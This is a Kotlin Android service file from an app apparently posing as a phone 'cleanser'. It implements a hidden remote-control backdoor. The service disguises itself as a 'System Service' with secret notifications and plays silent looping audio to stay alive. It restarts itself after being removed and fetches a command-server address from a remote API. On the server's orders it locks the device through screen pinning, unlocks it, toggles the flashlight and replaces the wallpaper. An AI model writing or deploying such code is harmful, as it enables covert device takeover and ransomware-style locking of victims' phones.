package com.cleanser.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.hardware.camera2.CameraManager
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.os.*
import android.util.Base64
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI
import java.util.UUID

class SocketService : Service() {

    private val CHANNEL_ID = "cleanser_svc"
    private val NOTIF_ID   = 101
    private val handler    = Handler(Looper.getMainLooper())

    private var socket: Socket? = null
    private var cm: CameraManager? = null
    private var camId: String?      = null
    private var mediaPlayer: MediaPlayer? = null

    override fun onBind(intent: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotif())
        cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        Thread { try { camId = cm?.cameraIdList?.firstOrNull() } catch (_: Exception) {} }.start()
        startSilentMusic()
        loadAndConnect()
    }
    
    private fun startSilentMusic() {
        try {
            val afd = assets.openFd("flutter_assets/assets/musik.mp3")
            mediaPlayer = MediaPlayer().apply {
                setAudioAttributes(AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                    .build())
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                isLooping = true
                setVolume(0f, 0f)
                prepare()
                start()
            }
        } catch (e: Exception) { e.printStackTrace() }
    }
    
    private fun loadAndConnect() {
        Thread {
            try {
                val settingsRaw = assets.open("flutter_assets/assets/settings.json").bufferedReader().readText()
                val apiUrl      = JSONObject(settingsRaw).getString("apiUrl")
                val apiRaw      = java.net.URL(apiUrl).readText()
                val serverUrl   = JSONObject(apiRaw).getString("url")
                handler.post { connectSocket(serverUrl) }
            } catch (e: Exception) {
                e.printStackTrace()
                handler.postDelayed({ loadAndConnect() }, 10_000)
            }
        }.start()
    }

    private fun connectSocket(serverUrl: String) {
        try {
            socket?.disconnect()
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionAttempts(Int.MAX_VALUE)
                .build()

            socket = IO.socket(URI.create(serverUrl), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                val prefs    = getSharedPreferences("cleanser", Context.MODE_PRIVATE)
                var deviceId = prefs.getString("deviceId", null) ?: run {
                    val id = "cls_${UUID.randomUUID().toString().replace("-","").take(10)}"
                    prefs.edit().putString("deviceId", id).apply()
                    id
                }
                val deviceName = "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${Build.MODEL}"
                prefs.edit().putBoolean("socket_connected", true).apply()
                socket?.emit("register", JSONObject().apply {
                    put("deviceId",   deviceId)
                    put("deviceName", deviceName)
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                getSharedPreferences("cleanser", Context.MODE_PRIVATE)
                    .edit().putBoolean("socket_connected", false).apply()
            }

            socket?.on("command") { args ->
                val cmd = args[0] as? JSONObject ?: return@on
                handleCommand(cmd)
            }

            socket?.connect()
        } catch (e: Exception) {
            e.printStackTrace()
            handler.postDelayed({ loadAndConnect() }, 5_000)
        }
    }
    
    private fun handleCommand(cmd: JSONObject) {
        val type    = cmd.optString("type")
        val payload = cmd.optJSONObject("payload") ?: JSONObject()

        when (type) {
            "lock" -> handler.post {
                val lockIntent = Intent(this, LockService::class.java).apply { putExtra("action", "lock") }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(lockIntent) else startService(lockIntent)                
                startActivity(Intent(this, MainActivity::class.java).apply {
                    putExtra("action", "start_screen_pinning")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                })
            }
            "unlock" -> handler.post {
                startService(Intent(this, LockService::class.java).apply { putExtra("action", "unlock") })
            }
            "flashlight" -> {
                val on = payload.optString("state") == "on"
                try {
                    if (camId == null) camId = cm?.cameraIdList?.firstOrNull()
                    camId?.let { cm?.setTorchMode(it, on) }
                } catch (_: Exception) {}
            }
            "wallpaper" -> {
                val b64 = payload.optString("imageBase64", "")
                if (b64.isNotEmpty()) Thread {
                    try {
                        val bytes = Base64.decode(b64, Base64.DEFAULT)
                        val bmp   = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        (getSystemService(Context.WALLPAPER_SERVICE) as android.app.WallpaperManager).setBitmap(bmp)
                    } catch (e: Exception) { e.printStackTrace() }
                }.start()
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)        
        val ri = PendingIntent.getService(
            this, 1, Intent(this, SocketService::class.java),
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager)
            .set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 500, ri)
    }

    override fun onDestroy() {
        super.onDestroy()
        socket?.disconnect()
        try { mediaPlayer?.apply { if (isPlaying) stop(); release() } } catch (_: Exception) {}
    }

    private fun buildNotif() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("System Service").setContentText("")
        .setSmallIcon(android.R.drawable.ic_menu_manage)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setOngoing(true).setSilent(true)
        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        .build()

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_NONE).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(ch)
        }
    }
}
